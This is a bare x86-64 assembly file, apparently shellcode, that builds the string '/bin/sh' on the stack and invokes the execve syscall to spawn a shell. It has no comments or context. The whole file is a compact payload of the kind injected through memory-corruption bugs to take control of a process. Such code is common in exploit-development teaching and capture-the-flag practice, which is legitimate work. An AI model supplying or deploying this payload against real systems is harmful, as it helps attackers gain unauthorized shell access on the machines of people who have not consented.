.global _start

.section .text

_start:
	xor %rsi, %rsi
	push %rsi
	movabs $0x68732f6e69622f, %rdi
	push %rdi
	push %rsp
	pop %rdi
	mov $0x3b, %al
	cltd
	syscall
